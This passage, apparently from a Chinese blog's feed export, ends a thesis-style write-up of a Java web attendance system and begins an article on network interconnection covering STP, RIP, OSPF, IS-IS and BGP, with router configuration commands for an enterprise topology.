id="4系统实现展示">4系统实现展示</h3><h4 id="4-1-登陆界面">4.1 登陆界面</h4><p>在此界面输入账号密码进入系统，如图4-1所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\登陆界面.jpg" style="zoom:50%;" /><center>图4-1 登陆界面</center>#### 4.2 系统首页 <p>不同权限用户进入不同的首页，具体区别在于可以使用的功能不同，如图4-2所示是普通员工首页，管理员首页左侧有本系统支持的各种功能，点击可以展开并跳转到该功能界面，在系统首页可以签到签退，在签到签退按钮下方会显示最新公告以便于查看，首页右上方可以退出系统登录，如图4-3所示</p><h4 id="4-3-系统个人信息模块功能">4.3 系统个人信息模块功能</h4><h5 id="4-3-1-查看个人信息：">4.3.1 查看个人信息：</h5><p>在此界面可以查看职工个人信息，如图4-6所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\查看个人信息.jpg" style="zoom: 67%;" /><center>图4-6 查看个人信息</center>##### 4.3.2 查看考勤记录：<p>可以查看各员工的签到时间，签退时间等考勤信息，如图4-7所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\考勤信息查看.jpg" style="zoom: 80%;" /><center>图4-7 考勤信息查看</center>##### 4.3.3 查看加班信息<p>查看加班信息支持查看加班信息的查看以及安排加班，如图4-8所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\加班信息查看.jpg" style="zoom:80%;" /><center>图4-8 加班信息查看</center>安排加班需要通过下拉栏选定员工和时间来安排加班，各项信息都是必填，倘若未填写则会有红字报错提醒<h5 id="4-3-4-申请请假">4.3.4 申请请假</h5><p>若企业员工需要请假，可以通过申请请假界面来实现请假操作，如图所示，员工需要填写各项信息，若必填信息未填写则会有提醒。如图4-10所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\申请请假.jpg" style="zoom:80%;" /><center>图4-10 申请请假</center>##### 4.3.5 查看请假记录<p>查看请假记录可以实现对请假列表的查看，请假列表包含了请假人姓名，请假时间、请假原因和审批状态等信息，如图4-11所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\查看请假记录.jpg" style="zoom: 80%;" /><center>图4-11 查看请假记录</center>#### 4.4 系统员工模块功能 <p>系统员工模块实现对员工信息的管理、考勤管理以及请假管理。</p><h5 id="4-4-1-员工管理">4.4.1 员工管理</h5><p>员工管理包括在职员工管理、离休员工管理、员工档案管理三项。在职员工管理可以查看在职员工信息并进行修改和删除，删除只需点击删除按钮即可，如图4-12所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\在职员工管理.jpg" style="zoom:80%;" /><center>图4-13 在职员工管理</center>添加员工需要按格式输入各项信息，其中有必填信息是必须要填写的，否则会有报错提醒，如图4-13所示。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\添加员工.jpg" style="zoom: 67%;" /><center>图4-13 添加员工</center>离休员工管理可以查看离休员工列表，获取离休时间等信息。如图4-14所示。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\离休员工管理.jpg" style="zoom: 80%;" /><center>图4-14 离休员工管理</center>##### 4.4.2考勤管理<p>考勤管理包含考勤管理和加班管理两项，其中考勤管理可以查看各员工的考勤记录，如图4-15所示。加班管理则是可以安排加班，如图4-16所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\员工考勤记录.jpg" style="zoom: 80%;" /><center>图4-15 员工考勤记录</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\加班管理.jpg" style="zoom: 80%;" /><center>图4-16 加班管理</center>加班管理可以安排人员加班，也可以修改和删除加班信息，安排加班具体如图4-17所示。修改加班信息如图4-18所示。删除加班信息点击删除按钮即可，如图4-16所示。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\添加加班安排.jpg" style="zoom: 80%;" /><center>图4-17 添加加班安排</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\加班信息修改.jpg" style="zoom: 80%;" /><center>图4-18 加班信息修改</center>##### 4.4.3 请假管理<p>请假管理是管理员功能，可以查看已批准和未批准的请假以及请假记录，如下图4-19所示，在请假记录一栏中可以看到各项已批准和未批准的请假记录，如图4-20所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\请假列表.jpg" style="zoom:80%;" /><center>图4-20 请假列表</center>#### 4.5 系统部门模块功能<p>部门管理模块是管理员功能，其中有两部分，分别为部门管理和职称管理。</p><h5 id="4-5-1部门管理">4.5.1部门管理</h5><p>部门管理页面展示了如部门名称、部门电话、部门地址等信息，通过此界面可以实现对部门的查看、添加和删除，对部门信息的修改功能，如图4-21所示。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\部门管理.jpg" style="zoom: 80%;" /><center>图4-21 部门管理</center>对部门的添加需要按格式输入部门的各项信息，如果出错则会报错提示，如图4-22所示：<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\添加部门.jpg" style="zoom:80%;" /><center>图4-22 添加部门</center>修改部门信息则需要在原信息基础上修改，如图4-23所示，修改完成后会弹窗提示修改成功，如图4-24所示：<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\修改部门信息.jpg" style="zoom:80%;" /><center>图4-23 修改部门信息</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\修改成功提示.jpg" style="zoom:80%;" /><center>图4-24 修改成功提示</center>##### 4.5.2 职称管理  <p>职称管理与部门管理大致相同，其实现了对职称的查看、添加、修改和删除。如图4-25所示，界面中展示了已有职称的信息，如要增删改需要按下相关按钮</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\职称管理.jpg" style="zoom:80%;" /><center>图4-25 职称管理</center>如图4-26所示为添加职称，其中职称名称为必填选项，如果未填写会有错误提示，职称的权限可以通过下拉栏来选择。<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\职称添加.jpg" style="zoom:80%;" /><center>图4-26 职称添加</center>对职称的修改需要点击修改按钮，在原基础上进行修改，如图4-27所示<img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\职称修改.jpg" style="zoom:80%;" /><center>图4-27 职称修改</center>#### 4.6 系统公告模块功能<h5 id="4-6-1公告管理">4.6.1公告管理</h5><p>公告管理中可以对公告进行查看、添加、修改、删除，如图4-28所示。添加公告时需要输入公告标题和内容，如图4-29所示。修改可以修改公告的标题和内容，如图4-30所示。删除只需点击删除按钮即可。</p><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\公告管理.jpg" style="zoom:80%;" /><center>图4-28 公告管理</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\添加公告.jpg" style="zoom:80%;" /><center>图4-29 添加公告</center><img src="D:\blog\shierjinghuang\source\_posts\智能考勤系统的设计与实现\修改公告.jpg" style="zoom: 80%;" /><center>图4-30 修改公告</center>### 5 结束语<p>企业考勤管理系统是为了解决员工考勤管理而设计的,目的是建立一个能够初步实现企业考勤管理系统的智能化管理,提高考勤管理效率,工作人员能够在各个岗位上的工作状态得到及时的反馈,而系统所需的工作人员的数量少,效率高，是一个企业单位不可缺少的一部分。企业考勤管理系统的开发是一项系统性工程，它不但涉及JSP、Web、数据库技术等技术领域，还涉及到管理观念、管理体制和管理科学，以及一些制度和人为的因素。因此，系统开发的各个环节都需要有效地衔接，有条不紊的进行。本文研究的主要目的是为了开发一个智能化、高效率的企业考勤管理系统。在本项目中我们初步分析了企业考勤管理系统的几个主要模块的功能与作用，经多次调试，该系统基本能够达到预期的效果。本系统是基于Web的企业考勤管理系统。由于企业考勤管理系统本身的复杂性，以及我们能力、开发技术的局限性，此系统还存在不少的缺陷和漏洞，有待进一步的改进和研究。</p><h3 id="参考文献：">参考文献：</h3><p>[1] 尚中君.探析JAVA编程语言在计算机软件开发中的应用[J].信息记录材料,2021,22(03):176-178.</p><p>[2] 朱宝善,陈光浦,李鹏程,王深.基于B/S模式和MySQL的人力资源管理系统设计[J].现代电子技术,2021,44(14):65-69.</p><p>[3] 张淼,刘东旭.基于JavaEE的人力资源管理系统的设计与实现[J].普洱学院学报,2020,36(03):35-36.</p><p>[4] 张艳明.动态网页开发Servlet基础实验综述[J].电脑知识与技术,2019,15 (20):80-82.</p><p>[5] 王军.计算机网络环境下的大学就业信息网研究[J],中国宇航出版社,2019,(10),115-117.</p><p>[6] 韩坤,林关成,安嘉豪,陈泽.基于B/S的高校学生学业预警系统设计与实现[J].信息技术,2021,(08):53-58.</p><p>[7] 王烽杰,郭玉靖.JAVA编程语言在计算机软件开发中运用[J].大众标准化,2020,(18):66-67.</p><p>[8] 赵国文,夏平平.基于JavaEE的人事管理系统的设计与实现[J].现代工业经济和信息化,2019,9(11):88-89.</p><p>[9] 王佳林,郭炀.基于计算机软件开发Java编程语言的分析研究及技术思考[J].科技风,2019,(33):108.</p><p>[10] 李琼.基于三层B/S架构的企业信息化管理系统的设计与实现[J].信息与电脑(理论版),2021,33(04):126-128.</p>]]></content>
      
      
      <categories>
          
          <category> 项目设计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 毕业论文 </tag>
            
            <tag> Java Spring </tag>
            
            <tag> Tomcat </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>网络互联技术的研究与应用</title>
      <link href="/2024/08/02/%E7%BD%91%E7%BB%9C%E4%BA%92%E8%81%94%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%BA%94%E7%94%A8/"/>
      <url>/2024/08/02/%E7%BD%91%E7%BB%9C%E4%BA%92%E8%81%94%E6%8A%80%E6%9C%AF%E7%9A%84%E7%A0%94%E7%A9%B6%E4%B8%8E%E5%BA%94%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h2 id="网络互联技术的研究与应用">网络互联技术的研究与应用</h2><p>**摘要：**目前的网络技术以高性能化、高传输效率和高品质的网络服务质量为目标，但现网中仍存在诸多亟需解决的问题。本文首先分析交换网络中涉及的问题，详细比较OSPF协议与IS-IS协议的特征和应用场景。其次，以工程拓扑、工程实施和工程步骤为主体，提出包含运营商和企业业务网络的拓扑结构，并详细阐述协议的部署过程，该结构可适用于企业总部与分支机构之间的互联。最后，分析了MSTP、OSPF和BGP协议的实施效果，并对网络进行优化，在一定程度上解决了网络中存在的数据风暴、路由环路和利用率问题，满足企业实际应用需求，可为当今企业承载高质量的数据通信业务。</p><p>**关键词：**网络互联  MSTP  OSPF IS-IS 网络优化</p><h3 id="引言">引言</h3><p>网络互联是指利用现有的网络设备与技术将不同地区、不同地理位置的独立自治系统连接在一起，形成一个更大的网络，实现单独自治系统的数据互通，使各个独立自制系统实现资源共享。在连接不同计算机或是不同工作站、服务器的时候，除了需要必要的连接器之外，还需要一些中介连接设备，这些设备之间又通过各种协议维护着网络动态平衡。</p><p>Internet时代的到来，使得基于互联网的应用越来越广泛，每天网络中都在交换大量的网络数据。互联网在医学方面、军事方面、学术方面、金融方面等都具有十分重大的意义。在一些金融领域，对网络响应速度的要求能达到毫秒级，有的公司为了提升几毫秒的响应速度，使用几百万资金来升级网络设备^[1]^。如果出现网络延迟，甚至网络中断，往往会造成很大的经济损失。</p><h3 id="1-网络互联设备">1  网络互联设备</h3><h4 id="1-1-交换机">1.1  交换机</h4><p>交换机外观上类似于集线器，所以也称交换式集线器，是简化的网桥。交换机可以看成高级的网桥设备，其端口数量远远大于网桥，而且具有很高的网络传输效率。</p><h5 id="1-1-1-二层交换机">1.1.1  二层交换机</h5><p>以太网交换机，一般用来连接类型相同的LAN，进行二层交换。交换机转发时会收到不同类型的数据帧，在网络上传播的数据帧可分为单播帧、未知单播帧、组播帧、广播帧，对不同类型的数据帧交换机处理方式也不尽相同。当交换机查找到此帧目的MAC地址是一个单播MAC地址时，经过对比交换机的MAC地址表发送到对应的接口，当交换机本地MAC地址表中查不到数据包中相对应的MAC地址信息，则此数据帧为未知单播帧，会将此数据帧泛洪处理。如果交换机收到目的MAC地址二进制高八位的第八位为1，则此数据帧为组播帧，会将数据帧泛洪到适当的组播组^[2]^。当交换机收到目的MAC地址为FF-FF-FF-FF-FF-FF时，此数据帧为广播帧，此数据帧则会泛洪处理。</p><h5 id="1-1-2-三层交换机">1.1.2  三层交换机</h5><p>三层交换机支持路由交换，可以在二层和三层工作，通过IP地址寻找通往目标网段的路径，数据帧会发生变化，封装成新的数据帧。</p><p>三层交换机在保留了二层交换机方便的VLAN规划技术和高处理速度的基础上，添加了三层的功能，通过硬件完成三层报文的高速传输，也降低了网络环境的复杂性。</p><h4 id="1-2-路由器">1.2  路由器</h4><h5 id="1-2-1-路由器简介">1.2.1  路由器简介</h5><p>路由器和网桥类似，通常在网络层工作，用于转化网络层上的协议，把逻辑上互相孤立的网络连接起来^[3]^。在使用路由器互联的网络中，每个子网都拥有自己的网络地址。当一个网络中的计算机要将数据发送给另一个网络中的主机时，首先需要将数据包发送给本网段的路由器，路由器会根据数据包中目的网段信息，查看由路由器间互相运行的路由协议生成的路由表，选择合适的路由进行转发，将数据交给正确的接收者。路由器通过软件实现功能，传输效率低，数据报文延迟比较大。</p><h5 id="1-2-2-路由器的功能">1.2.2  路由器的功能</h5><p>路由器的主要用于不同的子网在数据交换时选择正确的路由，路由器的常用功能包含下述三个方面。</p><ol><li>网络互联：可以将相同的或者不同的网络进行互联。</li><li>数据的处理：路由器可以将数据包进行分组过滤、分组转发、标记不同优先级（QoS）、加密等操作。</li><li>网络的管理：路由器可以通过不同路由策略来控制网络中不同流量的走向。</li></ol><h3 id="2-交换机协议">2  交换机协议</h3><h4 id="2-1-交换机网络中涉及的问题">2.1  交换机网络中涉及的问题</h4><p>通常交换机收到数据帧，会判断此数据帧的类型，除了已知单播帧会通过MAC地址表转发到相应的接口外，其他类型的数据帧都会进行泛洪处理，所以在交换网络中，如果没有任何措施有很大可能会产生数据风暴，如2-1所示</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\数据风暴.png"  /><center>图2-1 数据风暴</center><p>交换机通过绑定数据包中源MAC地址信息与相对应的接口来形成MAC地址表。如果网络中出现环路，会影响交换机中MAC地址表的正常生成令交换机中MAC地址表频繁变化，如图2-2所示。</p><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\MAC地址表震荡.png" style="zoom:80%;" /><center>图2-2 MAC地址表震荡</center><p>当交换机网络中出现上述问题时，会影响整个网络质量，正常数据包无法正常的在网络中传递，占用带宽资源，形成数据风暴，如果问题不能及时解决，最终会导致业务受到巨大影响，甚至网络瘫痪^[4]^。</p><h4 id="2-2-交换机stp协议的实现">2.2  交换机STP协议的实现</h4><p>交换机运行生成树（Spanning Tree Protocol，STP）协议，主要是通过在交换机之间传递网桥协议数据单元（Bridge Protocol Data Unit，BPDU），来形成二层网络的“树”，STP通过在网络中形成一颗无环的“树”来解决网络中有可能出现的环路，主要通过选举根交换机、根端口和指定端口实现。</p><h5 id="2-2-1-选举根交换机：">2.2.1 选举根交换机：</h5><ol><li>交换机标识的构成是16比特长度的交换机优先级加上48比特长度的MAC地址。</li><li>交换机默认使用32768作为优先级，可以配置为0到65535之间的数值。</li><li>网络中BID数值最小的成为根交换机，可以看成先比较BID中16比特长度的交换机优先级，当优先级无法选举出根交换机时，再对比48比特长度MAC地址。</li></ol><h5 id="2-2-2-选举根端口：">2.2.2 选举根端口：</h5><ol><li><p>首先比较非根交换机端口到达根交换机根路径开销（Root Path Cost）。</p></li><li><p>端口Link的上游交换机的BID，数值小的优先。</p></li><li><p>端口上Link的上行端口的PID（Port Identifier），数值小的优先。</p></li></ol><h5 id="2-2-3-选举指定端口：">2.2.3 选举指定端口：</h5><ol><li><p>首先比对该网段所有的端口所属交换机距离根交换机的距离，距离越近越优先。</p></li><li><p>比较所有交换机端口的交换机标识，交换机标识小的成为指定端口。</p></li><li><p>比较所有交换机端口的端口标识，端口标识小的成为指定端口。</p></li></ol><h3 id="3-路由器协议">3  路由器协议</h3><h4 id="3-1-路由协议简介">3.1  路由协议简介</h4><p>路由器提供了网络互联的机制，它能够将一个子网的数据包传递给另一个子网，从而实现子网之间的互相通信。路由器直接可以通过路由协议互相沟通收集网络中的信息，从而形成去往目标网段最优的路由条目。</p><h4 id="3-2-路由协议分类与特点">3.2  路由协议分类与特点</h4><p>路由协议按照其工作范围可以分为内部网关协议（Interior Gateway Protocol，IGP）与外部网关协议（Exterior Gateway Protocol, EGP），路由信息协议（Routing Information Protocol，RIP）、开放式最短路径优先（Open Shortest Path First，OSPF）、中间系统到中间系统（Intermediate System-to-Intermediate System，IS-IS）等属于IGP协议，边界网关协议（Border Gateway Protocol，BGP）等属于EGP协议^[5]^。</p><p>RIP基于UDP协议，端口号为520。无确认机制，无邻居概念，占用设备性能资源少。</p><p>BGP是基于TCP的，距离远、单播、要建立可靠的连接，如发送hello报文后，可以通过TCP的三次握手确认，端口号为179，使协议更加可靠。BGP用来在域间传递路由，所以要求有非常高的可靠性，从而使用TCP来保障稳定性。前提是在建立BGP会话前，需要先进行TCP连接，即通常所谓的IP网络的连通性。而建立BGP邻居的设备不要求直连，可以跨设备建立BGP邻居。</p><p>OSPF是基于IP的，协议号为89，因此它只支持IP网络。但由于IP层是不可靠的，OSPF开发了许多确认机制（hello包的邻居列表，DD报文使用seq做隐式确认，LSR/LSU/LSACK之间的相互确认）。基于IP的会话可以使用组播发送协议报文， OSPF可以自己发现邻居，并且建立邻居关系，但工作在IP及以上的协议较易于受到安全威胁。</p><p>IS-IS是基于数据链路层的，在特征上类似与OSPF，不同的是IS-IS收敛速度更快，并可以支持多种三层网络协议，包括非IP网络协议，而且具有较高的安全性。</p><h4 id="3-3-rip协议分析">3.3  RIP协议分析</h4><p>RIP协议作为一种IGP协议，可以进行动态路由选择，用来传递网络内的路由信息。RIP协议使用距离矢量算法，通过“跳数”来判断路由的优先级。RIP的路由器只知道自己周围路由器，只与他们交换路由信息。RIP广泛应用在网络中，主要有以下优点。</p><ol><li>相比其他IGP协议，占用设备系统资源少</li><li>相比静态路由可以动态的感知线路是否存在故障</li><li>适合用在对网络环境质量要求不高的小型网络，和一些大型网络的末梢节点等</li><li>相比其他IGP协议，没有邻居的概念，不用发送hello报文</li></ol><p>但RIP的缺陷也较为明显，主要包含下述四个方面</p><ol><li>RIP每30秒会向其他路由器更新所有路由信息，链路开销大，特别是在广域网链路上</li><li>RIP收敛慢，如准备切换需要180秒，路由的更新是一跳一跳传播</li><li>最大的跳数为16跳，限制了网络直径，不适合大型网络</li><li>最大跳数为16跳，无法根据实际链路状态来选择最优路径，不精确</li></ol><h4 id="3-4-ospf与is-is协议分析">3.4  OSPF与IS-IS协议分析</h4><h5 id="3-4-1-ospf与is-is协议简介">3.4.1  OSPF与IS-IS协议简介</h5><p>OSPF是一种IGP 协议，OSPF路由器会收集区域内所有LSA信息，形成一个LSDB，而后每台路由器通过自己的LSDB信息库以自己为根计算出一颗最短路径树</p><p>IS-IS是ISO组织针对OSI模型研发的协议，最初是应用在数据链路层，随着IP网络环境的推广流行，对IS-IS进行了扩展，使IS-IS适用于IP网络环境，这种扩展的IS-IS叫做集成IS-IS，IS-IS既可以运用在数据链路层，也可以用在IP层</p><p>OSPF共有8种状态机。路由器处于Down状态，发出一个Hello包。当路由器从其他路由收到Hello包，并发现这个Hello包中含有自己的Router ID，这时自己和邻居进入Init状态。当两端都收到含有自己Router ID的Hello包后进入2-way状态</p><p>进入2-way后，将选举出DR/BDR。进入2-way状态后，两个路由器进入邻居状态。这时只是邻居关系，只有进入Full状态才真正进入邻接状态，才会同步LSDB信息。</p><p>在Exstart状态时会互相发送First DBD，选出主从关系，主设备首先发送报文，确定序列号。</p><p>在Exchange相互交换DBD来互相传递LSA头部信息。当收到M位为0的DBD报文后表示最后一个DBD报文，进入Loading状态。进入Loading状态后，开始发送LS request报文请求本地LSDB库中不存在的LSA信息。在收到LS request请求后，向对端回应LS update报文，在LS update报文中，包含了LS request中请求的LSA详细信息。路由器收到LS update报文之后，向对端回复LS ack报文作确认，保证LSA同步的可靠性。LSDB同步完成后，进入Full状态，邻接关系完整建立。</p><p>IS-IS建立邻居的方式有两种2-way握手与3-way握手，IS-IS在广播链路上只支持3-way握手</p><ol><li>2-way握手，本端路由器收到IS-IS hello报文，就会单方向建立起邻居关系。</li><li>3-way握手，只有当本段路由器收到含有自己的System ID，才会建立起邻居关系。</li></ol><h5 id="3-4-2-ospf与is-is对比">3.4.2 OSPF与IS-IS对比</h5><p>OSPF与IS-IS都可以划分出不同区域类型，如骨干区域、非骨干区域、Stub区域、NSSA区域，在设备组网中，设备性能有差异，我们将性能好的安放在骨干区域，性能较差的安放在特殊区域中，这样在特殊区域通过缺省路由来访问外部路由，避免了大量外部路由对性能差的设备的冲击。虽然IS-IS也拥有不同的区域，但是区域类型相比OSPF较少，只有level-1、 level-2两种，在同一区域中如果有很多level-1-2路由器作为本区域数据出口，有可能会出现次优路径问题，如果使用路由泄露功能，对路由器性能要求变高。</p><p>如果网络中链路类型非常复杂，例如有PPP、帧中继这样的链路，那么这种情况下，OSPF是比较好的，因为OSPF可以支持的多种网络类型，有Broadcast、NBMA、P2P、P2MP，IS-IS只支持Broadcast和P2P，而且在帧中继网络中不管主接口还是子接口都只支持P2P，这样邻居关系是非常多的。</p><p>OSPF控制路由的手段是非常丰富的，通过划分特殊区域可以控制，并且OSPF有3类LSA、5类LSA的过滤，3类LSA、5类LSA、7类LSA的汇总，对于引入的外部路由可以配置type1类型和type2类型，还可以使用路由策略对路由控制。对于IS-IS来说，是没有这么多的手段的。</p><p>OSPF与IS-IS都使用I-SPF和PRC将网络的收敛性能进一步提高，对OSPF来说， 在一个Area内，任何1类LSA与2类LSA的变化都触发I-SPF计算，只有3/4/5/7LSA的变化才触发PRC计算，而在IS-IS中，每条路由前缀都是当前节点的叶子，路由前缀的变化只触发PRC计算，相比OSPF在Area内，路由前缀变化会使用I-SPF而言，IS-IS收敛会快些。</p><p>IS-IS一般是用于数据链路层的，支持IP环境也支持非IP环境，如果后期要在网络中部署Ipv6的话，IS-IS只需要增加相应的TLV，将IS-IS中Ipv6的功能打开就可以实现。对与OSPF来说，要从Ipv4向Ipv6过渡，只能在网络中全部运行Ospfv3，配置量和复杂度都是相对较大的。而且IS-IS支持进程下配置3个Network-entity地址，可以方便网络区域的重新规划、平滑过渡。这也是IS-IS扩展性强的一个体现。</p><p>OSPF一般使用在IP层面，IS-IS一般使用在数据链路层，由于IP层的攻击要比数据链路层的多，所以从这个角度讲，IS-IS更安全一些。综合上述各个方面，OSPF与IS-IS的主要差异如表3-1所示，网络管理员可以根据自身网络对区域类型、链路类型、收敛速度等的要求，选择部署何种类型的路由协议。</p><center>表3-1 IS-IS与OSPF对比</center><table><thead><tr><th></th><th>区域类型</th><th>链路类型</th><th>路由控制</th><th>安全性</th><th>收敛速度</th><th>扩展性</th></tr></thead><tbody><tr><td>IS-IS</td><td>单一</td><td>单一</td><td>单一</td><td>攻击较少</td><td>极快</td><td>强</td></tr><tr><td>OSPF</td><td>丰富</td><td>丰富</td><td>丰富</td><td>攻击较多</td><td>快速</td><td>差</td></tr></tbody></table><h3 id="4-网络协议应用">4  网络协议应用</h3><p>在现实网络环境中，大部分企业公司内部都会采用OSPF协议来构建三层网络环境。在一些小型网络或者大型网络的末梢节点会使用RIP协议。但在运营商网络中，IS-IS协议是比较常用的，运营商网络常常使用BGP协议为企业与企业之间传递路由信息。二层网络中，使用最为广泛为MSTP技术，不同VLAN对应不同生成树。下面将通过实际工程案例设计分析网络协议的应用。</p><h4 id="4-1-工程介绍">4.1  工程介绍</h4><p>某一大型企业，在外地开设分公司，总公司内部网络复杂且需要保证网络质量与亢余性，不能出现环路，网络某链路出现问题时需要保证网络的连通性。子公司网络环境较简单，也需保证网络的畅通性。需公司总部与分部通过租用运营商网络实现互通。子公司拥有一台服务器，总部需要访问此服务器。</p><p>运营商网络下，只有与企业相连的两台路由器建立IBGP邻居，运营商网络内其它路由器不参与BGP邻居的建立</p><h4 id="4-2-工程拓扑">4.2  工程拓扑</h4><p>工程拓扑如图4-1所示，AS100为运营商区域，AS10为企业总部区域，AS20为企业分部。交换机之间使用MSTP协议防止环路，AS100运行IS-IS协议，AS10运行OSPF协议动态学习路由，AR20运行RIP协议学习路由。AS10通过BGP协议将路由信息传递给AS20</p><ol><li>每个路由器配置一个环回接口，IP配置为10.1.X.X（X为路由器编号）</li><li>路由器互联网段地址为10.1.XY.X（X为本段路由器标号，Y为对端路由器编号）</li><li>所有路由器手动配置Router ID，地址为本路由器环回接口地址。</li><li>AR6与AR7互联网段运行在区域0中，AR5与AR6互联网段运行在区域1中，AR5与AR6运行在区域2中</li></ol><img src="D:\blog\shierjinghuang\source\_posts\网络互联技术的研究与应用\工程拓扑.png" alt="工程拓扑" style="zoom:80%;" /><center>图4-1 工程拓扑</center><h4 id="4-3-工程实施">4.3  工程实施</h4><ol><li>LSW1、LSW2、LSW3使用MSTP技术防止网络中产生环路</li><li>AS10使用OPSF协议组网，AS100使用IS-IS组网，AS20使用RIP组网</li><li>AS100通过BGP将AS10路由信息传递给AS20，AS100通过BGP将AS20路由信息传递给AS10。使AS10与AS20可以互相访问。在AS100内AR1与AR3建立IBGP邻居，其他路由不建立BGP邻居</li><li>PC1、PC2、PC3、PC4可以互相访问。Client2可以访问Server1</li></ol><h4 id="4-4-工程步骤">4.4  工程步骤</h4><blockquote><p>LSW1、LSW2、LSW3上运行MSTP</p></blockquote><pre class="line-numbers language-cisco" data-language="cisco"><code class="language-cisco"># 在LSW1、LSW2、LSW3上配置命令如下[SW1] stp mode mstp[SW2] stp mode mstp[SW3] stp mode mstp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>AR1、AR2、AR3、AR4运行IS-IS协议，配置System ID，所有互联接口开启IS-IS功能。</p></blockquote><pre class="line-numbers language-powershell" data-language="powershell"><code class="language-powershell"><span class="token comment">#在AR1、AR2、AR3、AR4上配置如下。</span><span class="token namespace">[AR1]</span>IS<span class="token operator">-IS</span><span class="token namespace">[AR1-IS-IS-1]</span>network<span class="token operator">-</span>entity 49<span class="token punctuation">.</span>0001<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0001<span class="token punctuation">.</span>00<span class="token namespace">[AR1]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>1<span class="token namespace">[AR1-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR1]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>2<span class="token namespace">[AR1-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR1]</span>interface LoopBack 0<span class="token namespace">[AR1-LoopBack0]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR2]</span>IS<span class="token operator">-IS</span><span class="token namespace">[AR2-IS-IS-1]</span>network<span class="token operator">-</span>entity 49<span class="token punctuation">.</span>0001<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0002<span class="token punctuation">.</span>00<span class="token namespace">[AR2]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>1<span class="token namespace">[AR2-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR2]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>0<span class="token namespace">[AR2-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR2]</span>interface LoopBack 0<span class="token namespace">[AR2-LoopBack0]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR3]</span>IS<span class="token operator">-IS</span><span class="token namespace">[AR3-IS-IS-1]</span>network<span class="token operator">-</span>entity 49<span class="token punctuation">.</span>0001<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0003<span class="token punctuation">.</span>00<span class="token namespace">[AR3]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>1<span class="token namespace">[AR3-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR3]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>2<span class="token namespace">[AR3-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR3]</span>interface LoopBack 0<span class="token namespace">[AR1-LoopBack0]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR4]</span>IS<span class="token operator">-IS</span><span class="token namespace">[AR4-IS-IS-1]</span>network<span class="token operator">-</span>entity 49<span class="token punctuation">.</span>0001<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0000<span class="token punctuation">.</span>0004<span class="token punctuation">.</span>00<span class="token namespace">[AR4]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>1<span class="token namespace">[AR4-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR4]</span>interface GigabitEthernet 0<span class="token operator">/</span>0<span class="token operator">/</span>2<span class="token namespace">[AR4-GigabitEthernet0/0/1]</span>IS<span class="token operator">-IS</span> enable<span class="token namespace">[AR4]</span>interface LoopBack 0<span class="token namespace">[AR4-LoopBack0]</span>IS<span class="token operator">-IS</span> enable<span aria-hidden="true" 